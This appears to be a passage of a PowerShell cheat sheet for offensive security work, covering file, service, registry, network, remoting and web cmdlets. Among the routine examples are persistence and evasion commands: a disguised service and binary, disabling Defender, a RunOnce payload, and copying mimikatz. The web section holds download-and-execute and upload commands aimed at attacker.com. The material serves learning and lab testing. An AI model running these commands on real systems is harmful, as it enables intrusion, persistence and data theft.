| `-Stream <name>`   | Read an NTFS Alternate Data Stream.                       |

### Creating, modifying, and removing items

| Cmdlet                                                                                                         | Description                                                   | Alias             |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- | ----------------- |
| [`New-Item`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/new-item)           | Create a new file, directory, or other item.                  | `ni`              |
| [`Set-Content`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/set-content)     | Write content to a file (overwrites existing).                | `sc`              |
| [`Add-Content`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/add-content)     | Append content to a file.                                     | `ac`              |
| [`Clear-Content`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/clear-content) | Remove content from a file without deleting the file.         | `clc`             |
| [`Remove-Item`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/remove-item)     | Delete files and directories. Use `-Recurse` for directories. | `rm`, `del`, `ri` |

- Create a new file:

```powershell
New-Item -Path "C:\Temp\output.txt" -ItemType File
```

- Create a new directory:

```powershell
New-Item -Path "C:\Temp\logs" -ItemType Directory
```

```powershell
mkdir C:\Temp\logs 
```

- Write content to a file (overwrite):

```powershell
Set-Content -Path "C:\Temp\output.txt" -Value "Hello, World!"
"Hello, World!" | Set-Content "C:\Temp\output.txt"
```

- Append content to a file:

```powershell
Add-Content -Path "C:\Temp\output.txt" -Value "Second line"
```

- Delete a file:

```powershell
Remove-Item "C:\Temp\output.txt"
```

```powershell
rm "C:\Temp\output.txt"
```

- Delete a directory and all its content:

```powershell
Remove-Item "C:\Temp\old_logs" -Recurse -Force
```

- Create a hidden file (set `Hidden` attribute):

```powershell
$file = New-Item "C:\Temp\hidden.txt" -ItemType File
$file.Attributes = "Hidden"
```

- Write to NTFS Alternate Data Stream (ADS):

```powershell
Set-Content -Path "C:\Temp\normal.txt" -Value "Normal content"
Set-Content -Path "C:\Temp\normal.txt" -Stream "hidden" -Value "Hidden content in ADS"
Get-Content -Path "C:\Temp\normal.txt" -Stream "hidden"
```

### Copying and moving


| Cmdlet                                                                                                     | Description                           | Alias               |
| ---------------------------------------------------------------------------------------------------------- | ------------------------------------- | ------------------- |
| [`Copy-Item`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/copy-item)     | Copy files or directories.            | `cp`, `copy`, `cpi` |
| [`Move-Item`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/move-item)     | Move or rename files and directories. | `mv`, `move`, `mi`  |
| [`Rename-Item`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/rename-item) | Rename a file or directory.           | `rni`               |

- Copy a file:

```powershell
Copy-Item "C:\source\file.txt" "C:\dest\file.txt"
```

- Copy a directory and all its contents:

```powershell
Copy-Item "C:\source\dir" "C:\dest\dir" -Recurse
```

- Move a file:

```powershell
Move-Item "C:\temp\payload.exe" "C:\Windows\System32\svchost_update.exe"
```

- Rename a file:

```powershell
Rename-Item "C:\Temp\old_name.txt" "new_name.txt"
```
## Finding and filtering objects

| Cmdlet                                                                                                            | Description                                                          | Alias          |
| ----------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- | -------------- |
| [`Where-Object`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object)      | Filter pipeline objects by property values or script block criteria. | `?`, `where`   |
| [`Select-Object`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-object) | Select specific properties, first/last `N` objects, or unique items. | `select`       |
| [`Select-String`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string) | Pattern matching in strings and files (like `grep`).                 | `sls`          |
| [`Sort-Object`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/sort-object)     | Sort pipeline objects by one or more properties.                     | `sort`         |
| [`Get-Member`](https://learn.microsoft.com/powershell/module/microsoft.powershell.utility/get-member)             | Reveal object properties and methods (what you can filter on).       | `gm`           |
| [`ForEach-Object`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/foreach-object)        | Execute a script block for each object in the pipeline.              | `%`, `foreach` |
| [`Out-GridView`](https://learn.microsoft.com/powershell/module/microsoft.powershell.utility/out-gridview)         | Display results in an interactive GUI window.                        | `ogv`          |

>[!tip]+
>To know what properties you can filter on, use `Get-Member`.

- Show object properties and methods:

```powershell
Get-LocalUser Administrator | Get-Member
```

> [!example]-
> ```powershell
> Get-LocalUser Administrator | Get-Member
> ```
> 
> ```powershell
>    TypeName: Microsoft.PowerShell.Commands.LocalUser
> 
> Name                   MemberType Definition
> ----                   ---------- ----------
> Clone                  Method     Microsoft.PowerShell.Commands.LocalUser Clone()
> Equals                 Method     bool Equals(System.Object obj)
> GetHashCode            Method     int GetHashCode()
> GetType                Method     type GetType()
> ToString               Method     string ToString()
> AccountExpires         Property   System.Nullable[datetime] AccountExpires {get;set;}
> Description            Property   string Description {get;set;}
> Enabled                Property   bool Enabled {get;set;}
> FullName               Property   string FullName {get;set;}
> LastLogon              Property   System.Nullable[datetime] LastLogon {get;set;}
> Name                   Property   string Name {get;set;}
> ObjectClass            Property   string ObjectClass {get;set;}
> PasswordChangeableDate Property   System.Nullable[datetime] PasswordChangeableDate {get;set;}
> PasswordExpires        Property   System.Nullable[datetime] PasswordExpires {get;set;}
> PasswordLastSet        Property   System.Nullable[datetime] PasswordLastSet {get;set;}
> PasswordRequired       Property   bool PasswordRequired {get;set;}
> PrincipalSource        Property   System.Nullable[Microsoft.PowerShell.Commands.PrincipalSource] PrincipalSource {get;set;}
> SID                    Property   System.Security.Principal.SecurityIdentifier SID {get;set;}
> ```

- Using `Select-Object`:

```powershell
Get-LocalUser Administrator | Select-Object -Property *
```

>[!example]-
> ```powershell
> Get-LocalUser Administrator | Select-Object -Property *
> ```
> 
> ```powershell
> 
> AccountExpires         : 
> Description            : Built-in account for administering the computer/domain
> Enabled                : True
> FullName               : 
> PasswordChangeableDate : 11/20/2022 12:41:58 PM
> PasswordExpires        : 
> UserMayChangePassword  : True
> PasswordRequired       : True
> PasswordLastSet        : 11/19/2022 12:41:58 PM
> LastLogon              : 
> Name                   : Administrator
> SID                    : S-1-5-21-4125911421-2584895310-3954972028-500
> PrincipalSource        : Local
> ObjectClass            : User
> ```
### Where-Object

`Where-Object` filters objects in the pipeline. The current pipeline object is always referenced as `$_` (or `$PSItem`).


- Comparison in a script block:

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 }
```

```powershell
Get-Service | Where-Object { $_.Status -eq 'Running' }
```

```powershell
Get-LocalUser | Where-Object { $_.Enabled -eq $true }
```

>[!tip]+
> - Simplified comparison syntax (PS 3.0+, less code, less flexible)
> 
> ```powershell
> Get-Service | Where-Object Status -eq 'Running'
> Get-LocalUser | Where-Object Enabled -eq $true
> ```

- Multiple conditions:

```powershell
Get-Process | Where-Object { $_.CPU -gt 50 -and $_.WorkingSet64 -gt 100MB }
```

- Match strings:

```powershell
Get-Process | Where-Object { $_.Name -like "svc*" }
```

- Regex match:

```powershell
Get-Process | Where-Object { $_.Name -match "^win" }
```

- Check for `null`:

```powershell
Get-LocalUser | Where-Object { $_.LastLogon -eq $null }
```

- `Where-Object` options:

| Option                        | Description                                                       |
| ----------------------------- | ----------------------------------------------------------------- |
| `‑FilterScript <scriptblock>` | Define a script block that evaluates to true for objects to keep. |
| `‑Property <string>`          | Specify object property to compare (simplified syntax).           |
| `‑Value <object>`             | The value to compare with the property (used with `‑Property`).   |

- Comparison operators:

| Operator    | Meaning              | Case-sensitive variant |
| ----------- | -------------------- | ---------------------- |
| `-eq`       | Equal                | `-ceq`                 |
| `-ne`       | Not equal            | `-cne`                 |
| `-gt`       | Greater than         | `-cgt`                 |
| `-lt`       | Less than            | `-clt`                 |
| `-ge`       | Greater or equal     | `-cge`                 |
| `-le`       | Less or equal        | `-cle`                 |
| `-like`     | Wildcard match       | `-clike`               |
| `-notlike`  | Wildcard non-match   | `-cnotlike`            |
| `-match`    | Regex match          | `-cmatch`              |
| `-notmatch` | Regex non-match      | `-cnotmatch`           |
| `-in`       | Value in array       |                        |
| `-notin`    | Value not in array   |                        |
| `-contains` | Array contains value |                        |

### Select-Object

`Select-Object` shapes the objects coming through the pipeline — pick specific properties, limit the count, de-duplicate.

- Select specific properties (creates a new `PSCustomObject` with only those properties):

```powershell
Get-Process | Select-Object Name, CPU, Id, WorkingSet64
```

- Select all properties:

```powershell
Get-LocalUser Administrator | Select-Object -Property *
```

- First and last `N` items:

```powershell
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

```powershell
Get-History | Select-Object -Last 20
```

- Unique values (de-duplicate):

```powershell
Get-Process | Select-Object -ExpandProperty Name -Unique | Sort-Object
```

- `ExpandProperty` extracts the value of a property directly (not a new object):


```powershell
Get-Process | Select-Object -ExpandProperty Name   # Returns strings, not objects
```

- Calculate properties and rename them on-the-fly:

```powershell
Get-Process | Select-Object Name, @{Name='MemoryMB'; Expression={ [Math]::Round($_.WorkingSet64 / 1MB, 2) }}
```

| Parameter                  | Description                                      |
| -------------------------- | ------------------------------------------------ |
| `-Property <props>`        | Select specific properties to include.           |
| `-ExcludeProperty <props>` | Exclude specific properties.                     |
| `-ExpandProperty <prop>`   | Extract raw values from a single property.       |
| `-First <n>`               | Return the first `N` objects.                    |
| `-Last <n>`                | Return the last `N` objects.                     |
| `-Skip <n>`                | Skip the first `N` objects.                      |
| `-Unique`                  | Return only unique objects (removes duplicates). |

### Select-String

`Select-String` searches strings and files for patterns; it supports both literal and regex match, and returns matched objects with file path, line number, and the matched line.

- Search a file for a pattern:

```powershell
Select-String -Path "C:\Windows\System32\drivers\etc\hosts" -Pattern "localhost"
```

- Grep through multiple files:

```powershell
Select-String -Path "C:\IIS\Logs\*.log" -Pattern "401|403|500"
```

- Regex match:

```powershell
Select-String -Path .\*.txt -Pattern "\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"  # IP addresses
```

- Search input from pipeline:

```powershell
Get-Process | Select-String "svchost"
```

- Return non-matching lines (invert matching):

```powershell
Get-Content hosts.txt | Select-String -Pattern "^#" -NotMatch
```

- Show context lines around matches:

```powershell
Select-String -Path app.log -Pattern "ERROR" -Context 2,3
```


- `Select-String` options:

| Parameter                 | Description                                       |
| ------------------------- | ------------------------------------------------- |
| `-Pattern <patterns>`     | Pattern(s) to search for (regex by default).      |
| `-Path <paths>`           | Files to search (wildcards supported).            |
| `-AllMatches`             | Return all matches per line, not just first.      |
| `-NotMatch`               | Return lines that don't match the pattern.        |
| `-CaseSensitive`          | Case-sensitive matching (default is insensitive). |
| `-SimpleMatch`            | Literal string match instead of regex.            |
| `-Context <before,after>` | Show `N` lines before and after matches.          |
| `-Encoding <type>`        | File encoding to use for reading.                 |

### Sort-Object

- Sort ascending (default):

```powershell
Get-Process | Sort-Object CPU
```

- Sort descending:

```powershell
Get-Process | Sort-Object CPU -Descending
```

- Sort by multiple properties:

```powershell
Get-Service | Sort-Object Status, DisplayName
```

- Sort and remove duplicates:

```powershell
Get-Process | Sort-Object Name -Unique
```

| Option                    | Description                                                   |
| ------------------------- | ------------------------------------------------------------- |
| `‑Property <Object[]>`    | Property or properties to sort by (can use expressions).      |
| `‑Descending`             | Sort results in descending order (default is ascending).      |
| `‑CaseSensitive`          | Perform case‑sensitive sorting (default is case‑insensitive). |
| `‑Unique`                 | Remove duplicate values from the sorted output.               |
| `‑InputObject <PSObject>` | Accept input object(s) explicitly (rarely used).              |
| `‑Culture <String>`       | Use specific culture rules for sorting strings.               |

## Working with services

PowerShell provides full control over service objects via the `Microsoft.PowerShell.Management` module.

| Cmdlet                                                                                                                   | Description                                                   | Alias  |
| ------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- | ------ |
| [`Get-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service)         | Enumerate service objects and their status.                   | `gsv`  |
| [`Start-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-service)     | Start a stopped service.                                      | `sasv` |
| [`Stop-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-service)       | Stop a running service.                                       | `spsv` |
| [`Restart-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/restart-service) | Stop and restart a service.                                   |        |
| [`Suspend-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/suspend-service) | Pause a running service (if the service supports pausing).    |        |
| [`Resume-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/resume-service)   | Resume a paused service.                                      |        |
| [`Set-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service)         | Modify service properties: startup type, description, status. |        |
| [`New-Service`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-service)         | Create a new Windows service.                                 |        |

- List all services:

```powershell
Get-Service
```

- List all running services:

```powershell
Get‑Service | Where‑Object Status ‑eq 'Running'
```

- Get a specific service:

```powershell
Get-Service -Name "wuauserv"
```

```powershell
Get-Service -DisplayName "*Defender*"
```

- Get services and their dependent services:

```powershell
Get-Service -Name "wuauserv" -DependentServices
```

```powershell
Get-Service -Name "wuauserv" -RequiredServices
```

- Start Windows Defender service:

```powershell
Start-Service -Name "WinDefend"
```

- Force-stop a service (stops dependent services, too):

```powershell
Stop-Service -Name "IISAdmin" -Force
```

- Force-restart a service:

```powershell
Restart-Service -Name "wuauserv" -Force
```

- Change startup type to automatic and start the service:

```powershell
Set-Service -Name "Spooler" -StartupType Automatic -Status Running
```

- Disable a service:

```powershell
Set-Service -Name "WinDefend" -StartupType Disabled
```

- Create a new service (requires admin):

```powershell
New-Service -Name "SvcUpdate" -BinaryPathName "C:\Windows\System32\svchost_update.exe" -DisplayName "Windows Update Helper" -StartupType Automatic -Description "Provides system update services"

```
## Working with the registry

PowerShell exposes the Windows Registry through the **provider model** — the same cmdlets you use for the filesystem (`Get-ChildItem`, `Get-Item`, `New-Item`, etc.) also work on registry paths, but you reference them through `PSDrives` like `HKLM:` and `HKCU:`.


>A **`PSDrive`** is a named virtual drive that exposes a hierarchical data store (filesystem, registry, certificate store, environment variables, etc.) through a unified interface.

>[!note] See [[Windows Registry]].


| Cmdlet                                                                                                       | Description                                   | Alias      |
| ------------------------------------------------------------------------------------------------------------ | --------------------------------------------- | ---------- |
| `Get-ChildItem HKLM:\...`                                                                                    | List registry subkeys at a path.              | `gci`      |
| `Get-Item HKLM:\...`                                                                                         | Get a specific registry key object.           | `gi`       |
| `Get-ItemProperty HKLM:\...`                                                                                 | Read values stored in a registry key.         | `gp`       |
| `New-Item HKLM:\...`                                                                                         | Create a new registry key.                    | `ni`       |
| `New-ItemProperty HKLM:\...`                                                                                 | Create a new registry value (entry).          |            |
| `Set-ItemProperty HKLM:\...`                                                                                 | Modify an existing registry value.            |            |
| `Remove-ItemProperty HKLM:\...`                                                                              | Delete a registry value.                      |            |
| `Remove-Item HKLM:\...`                                                                                      | Delete an entire registry key and subkeys.    | `ri`       |
| [`Test-Path`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/test-path)       | Check whether a registry key or value exists. |            |
| [`Set-Location`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/set-location) | Navigate into a registry `PSDrive`.           | `cd`, `sl` |



- Navigate to the registry like a filesystem:

```powershell
Set-Location HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion
Get-ChildItem
```

- Read values from a key:

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

- List all `AutoRun` entries (classic persistence locations):

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

- Check if a key exists:

```powershell
Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

- Create a new registry key:

```powershell
New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\" -Name "TestKey"
```

- Set a new registry value:

```powershell
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" `
    -Name "Updater" -PropertyType String -Value "C:\Users\Username\Downloads\payload.exe"
```

- Modify an existing value:

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\MyApp" -Name "Enabled" -Value 0
```

- Delete a specific value:

```powershell
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" -Name "Updater"
```

- Delete a key and all subkeys:

```powershell
Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" -Recurse
```

- Read a value by its name:

```powershell
(Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild
```
## Network management

| Cmdlet                                                                                                    | Description                                                              |
| --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| [`Get-NetAdapter`](https://learn.microsoft.com/powershell/module/netadapter/get-netadapter)               | List network adapters, their status, MAC address, and link speed.        |
| [`Get-NetIPAddress`](https://learn.microsoft.com/powershell/module/nettcpip/get-netipaddress)             | Show IP address configuration for all interfaces.                        |
| [`Get-NetIPConfiguration`](https://learn.microsoft.com/powershell/module/nettcpip/get-netipconfiguration) | Show detailed network config (IPs, gateway, DNS) — like `ipconfig /all`. |
| [`Get-NetIPInterface`](https://learn.microsoft.com/powershell/module/nettcpip/get-netipinterface)         | View adapter-level IP interface properties (DHCP, MTU, metrics).         |
| [`Get-NetNeighbor`](https://learn.microsoft.com/powershell/module/nettcpip/get-netneighbor)               | Show ARP/neighbor cache — like `arp -a`.                                 |
| [`Get-NetTCPConnection`](https://learn.microsoft.com/powershell/module/nettcpip/get-nettcpconnection)     | List active and listening TCP connections — like `netstat -an`.          |
| [`Get-NetRoute`](https://learn.microsoft.com/powershell/module/nettcpip/get-netroute)                     | Display the routing table.                                               |

- List network adapters:

```powershell
Get-NetAdapter
```

>[!example]-
> ```powershell
> Get-NetAdapter
> ```
> ```powershell
> 
> Name                      InterfaceDescription                    ifIndex Status       MacAddress             LinkSpeed
> ----                      --------------------                    ------- ------       ----------             ---------
> Ethernet2                 vmxnet3 Ethernet Adapter #2                  14 Up           00-50-56-B0-1F-E3        10 Gbps
> Ethernet0                 vmxnet3 Ethernet Adapter                     11 Up           00-50-56-B0-CD-57        10 Gbps
> ```
> 

- All IP addresses:

```powershell
Get-NetIPAddress | Select-Object InterfaceAlias, AddressFamily, IPAddress, PrefixLength
```

- Detailed config:

```powershell
Get-NetIPConfiguration
```

```powershell
ipconfig /all
```

>[!example]-
> ```powershell
> Get‑NetIPConfiguration
> ```
> 
> ```powershell
> InterfaceAlias       : Ethernet0
> InterfaceIndex       : 11
> InterfaceDescription : vmxnet3 Ethernet Adapter
> NetProfile.Name      : Network 2
> IPv6Address          : dead:beef::d96b:c5db:b619:d127
>                        dead:beef::16e
> IPv4Address          : 10.129.16.253
> IPv6DefaultGateway   : fe80::250:56ff:feb0:5b4c
> IPv4DefaultGateway   : 10.129.0.1
> DNSServer            : 127.0.0.1
> 
> InterfaceAlias       : Ethernet2
> InterfaceIndex       : 14
> InterfaceDescription : vmxnet3 Ethernet Adapter #2
> NetProfile.Name      : greenhorn.corp
> IPv4Address          : 172.16.5.100
> IPv6DefaultGateway   :
> IPv4DefaultGateway   : 172.16.5.1
> DNSServer            : 172.16.5.155
> ```

- APR cache:

```powershell
Get-NetNeighbor | Select-Object InterfaceAlias, IPAddress, LinkLayerAddress, State
```

```powershell
arp -a
```

- Active TCP connections:

```powershell
Get-NetTCPConnection | Where-Object State -eq 'Established' |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State |
    Sort-Object RemoteAddress
```


- Listening ports:

```powershell
Get-NetTCPConnection | Where-Object State -eq 'Listen' |
    Select-Object LocalAddress, LocalPort | Sort-Object LocalPort
```

```powershell
netstat -an
```

### Connectivity tests

- ICMP ping test:

```powershell
Test-Connection -ComputerName "10.10.10.1" -Count 3
```

- Return `$true` if reachable, `$false` if not:

```powershell
$result = Test-Connection -ComputerName "google.com" -Count 1 -Quiet
```

- Port check (like `nc -zv`):

```powershell
Test-NetConnection -ComputerName "10.10.10.11" -Port 445
```

- Check SMB:

```powershell
Test-NetConnection -ComputerName "DC01.corp.local" -Port 445
```

- Check WinRM:

```powershell
Test-NetConnection -ComputerName "10.10.10.11" -Port 5985
```

- Check RDP:

```powershell
Test-NetConnection -ComputerName "10.10.10.11" -Port 3389
```

- Traceroute:

```powershell 
Test-NetConnection -ComputerName "google.com" -TraceRoute
```

- Test WinRM connectivity and configuration:

```powershell
Test-WSMan -ComputerName "10.129.224.248"
```

### Network configuration

- Assign a static IP address:

```powershell
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress "192.168.1.200" `
    -PrefixLength 24 -DefaultGateway "192.168.1.1"
```

- Modify an existing IP address

```powershell
Set-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress "192.168.1.201" -PrefixLength 24
```

- Remove an IP address:

```powershell
Remove-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress "192.168.1.200" -Confirm:$false
```

- Set DNS servers:

```powershell
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses ("8.8.8.8","8.8.4.4")
```

-  View configured DNS servers:

```powershell
Get-DnsClientServerAddress
```

- Disable/enable adapter:

```powershell
Disable-NetAdapter -Name "Ethernet" -Confirm:$false
Enable-NetAdapter -Name "Ethernet"
```

- Restart adapter (apply changes):

```powershell
Restart-NetAdapter -Name "Ethernet"
```

- Assign static IP address:

```powershell
New‑NetIPAddress -InterfaceAlias "Ethernet" -IPAddress "192.168.1.200" -PrefixLength 24 -DefaultGateway "192.168.1.1"
```

- Set DNS servers:

```powershell
Set‑DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses ("8.8.8.8","8.8.4.4")
```

### Routing and DNS

- Resolve a domain (like `nslookup`):

```powershell
Resolve-DnsName "example.com"
```

- Get `MX` records:

```powershell
Resolve-DnsName "corp.local" -Type MX
```

- Specify a DNS server:

```powershell
Resolve-DnsName "corp.local" -Server "172.16.5.155"
```

- View a routing table:

```powershell
Get-NetRoute | Select-Object DestinationPrefix, NextHop, RouteMetric, InterfaceAlias
```

- Add a static route:

```powershell
New-NetRoute -DestinationPrefix "10.20.0.0/16" -NextHop "192.168.1.1" -InterfaceAlias "Ethernet"
```

- Remove a route:

```powershell
Remove-NetRoute -DestinationPrefix "10.20.0.0/16" -Confirm:$false
```

### Remote management

- Enable `PSRemoting` (requires admin):

```powershell
Enable-PSRemoting -Force
```

- Configure WinRM service:

```powershell
winrm quickconfig
```

- Test WinRM connectivity:

```powershell
Test-WSMan -ComputerName "TARGET01"
```

- Open an interactive remote session:

```powershell
Enter-PSSession -ComputerName "10.129.224.248" -Credential (Get-Credential)
Enter-PSSession -ComputerName "DC01.corp.local" -Credential "CORP\Administrator" -Authentication Negotiate
```

- Run a command on a remote machine without entering a session:

```powershell 
Invoke-Command -ComputerName "TARGET01" -ScriptBlock { Get-LocalUser }
Invoke-Command -ComputerName "TARGET01" -Credential (Get-Credential) -ScriptBlock { whoami; hostname }
```

- Run a command on multiple machines simultaneously:


```powershell 
Invoke-Command -ComputerName "SRV01","SRV02","SRV03" -ScriptBlock { Get-Service Spooler }
```

- Create a persistent session (reusable connection):

```powershell 
$session = New-PSSession -ComputerName "TARGET01" -Credential (Get-Credential)
Invoke-Command -Session $session -ScriptBlock { Get-Process }
Enter-PSSession -Session $session
Remove-PSSession $session
```

- Copy files through a `PSSession`:

```powershell
Copy-Item -Path "C:\Tools\mimikatz.exe" -Destination "C:\Windows\Temp\" -ToSession $session
```

> [!note] PSRemoting uses WinRM over port `5985` (HTTP) or `5986` (HTTPS). Authentication options include `Negotiate` (Kerberos/NTLM), `Basic`, `Kerberos`, `CredSSP`, and `Certificate`.

- Configure WinRM:

```powershell
winrm quickconfig
```

- Establish a PowerShell session:

```powershell
Enter-PSSession -ComputerName 10.129.224.248 -Credential Username -Authentication Negotiate
```

## Interactive with the web


| Cmdlet                                                                                                                    | Description                                                                  | Alias                 |
| ------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | --------------------- |
| [`Invoke-WebRequest`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) | HTTP/HTTPS client — download files, interact with web pages, send form data. | `iwr`, `curl`, `wget` |
| [`Invoke-RestMethod`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod) | REST API client — automatically parses JSON/XML responses into objects.      | `irm`                 |
| [`Start-BitsTransfer`](https://learn.microsoft.com/en-us/powershell/module/bitstransfer/start-bitstransfer)               | Background Intelligent Transfer Service — reliable large file downloads.     |                       |


>[!note] See [[Windows_file_transfers]].

- Download a file:

```powershell
Invoke-WebRequest -Uri "http://attacker.com/tool.exe" -OutFile "C:\Windows\Temp\tool.exe"
```

```powershell
iwr "http://attacker.com/tool.exe" -OutFile "C:\Windows\Temp\tool.exe"
```

- Download and execute in-memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")
```

- Using `Invoke-RestMethod`:

```powershell
IEX (Invoke-RestMethod "http://attacker.com/payload.ps1")
```

- Download as string and execute:

```powershell
$code = (Invoke-WebRequest -Uri "http://attacker.com/script.ps1").Content
Invoke-Expression $code
```

- Download with custom headers:

```powershell
Invoke-WebRequest -Uri "http://target.com/api/data" -Headers @{Authorization="Bearer TOKEN123"}
```

- `POST` request, JSON body:

```powershell
$body = @{ username = "admin"; password = "Password1" } | ConvertTo-Json
Invoke-RestMethod -Uri "http://api.target.com/login" -Method POST -Body $body -ContentType "application/json"
```

- Inspect HTTP response headers:

```powershell
$response = Invoke-WebRequest -Uri "https://target.com" -Method HEAD
$response.Headers
```

- Get images or links from a web page:

```powershell
$page = Invoke-WebRequest -Uri "https://example.com"
$page.Links | Select-Object href
$page.Images | Select-Object src, alt
```

- Upload a file (multipart form):

```powershell
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST `
    -InFile "C:\collected\data.zip" -ContentType "application/octet-stream"
```

- Using .NET `WebClient`:

```powershell
(New-Object Net.WebClient).DownloadFile("http://attacker.com/tool.exe", "C:\Windows\Temp\tool.exe")
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")
```

- BITS transfer (blends in with normal Windows update traffic):

```powershell
Start-BitsTransfer -Source "http://attacker.com/payload.exe" -Destination "C:\Temp\payload.exe"
```

## References and further reading

- [`Understanding a Windows PowerShell Module — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.6&viewFallbackFrom=powershell-7.2)
- [`about_Modules — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_modules?view=powershell-7.5)

- [`about_Output_Streams — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_output_streams?view=powershell-7.5)
- [`Common Parameters — SS64`](https://ss64.com/ps/common.html)
[`Common Parameter Names — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/common-parameter-names?view=powershell-7.5)
- [`about_PSModulePath — Mirosoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath?view=powershell-7.5)
- [`about_Module_Manifests — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.6&ref=benheater.com)
- [`Creating a PowerShell Module — 0xBEN`](https://benheater.com/creating-a-powershell-module/)

- [`Approved Verbs for PowerShell Commands — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.5)
- [`AMSI.fail`](https://amsi.fail/)
- [`about_Transactions — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_transactions?view=powershell-5.1)
## Appendix A: Common aliases

|Alias|Full Cmdlet|
|---|---|
|`ls`, `dir`, `gci`|`Get-ChildItem`|
|`cd`, `sl`, `chdir`|`Set-Location`|
|`pwd`|`Get-Location`|
|`cat`, `gc`, `type`|`Get-Content`|
|`cp`, `copy`, `cpi`|`Copy-Item`|
|`mv`, `move`, `mi`|`Move-Item`|
|`rm`, `del`, `ri`|`Remove-Item`|
|`mkdir`, `md`|`New-Item -ItemType Directory`|
|`echo`, `write`|`Write-Output`|
|`ps`, `gps`|`Get-Process`|
|`kill`|`Stop-Process`|
|`gsv`|`Get-Service`|
|`sasv`|`Start-Service`|
|`spsv`|`Stop-Service`|
|`gm`|`Get-Member`|
|`?`, `where`|`Where-Object`|
|`%`, `foreach`|`ForEach-Object`|
|`select`|`Select-Object`|
|`sort`|`Sort-Object`|
|`group`|`Group-Object`|
|`measure`|`Measure-Object`|
|`iex`|`Invoke-Expression`|
|`icm`|`Invoke-Command`|
|`sls`|`Select-String`|
|`fl`|`Format-List`|
|`ft`|`Format-Table`|
|`fw`|`Format-Wide`|
|`tee`|`Tee-Object`|
|`diff`|`Compare-Object`|
|`sc`|`Set-Content` (conflicts with `sc.exe`!)|
|`gcm`|`Get-Command`|
|`gal`|`Get-Alias`|
|`clc`|`Clear-Content`|
|`cls`, `clear`|`Clear-Host`|
|`h`, `history`|`Get-History`|
|`r`|`Invoke-History`|
|`man`, `help`|`Get-Help`|
>[!warning] `sc` is aliased to `Set-Content` in PowerShell, which conflicts with `sc.exe` (Service Controller). Use `sc.exe` explicitly when managing services from PowerShell.

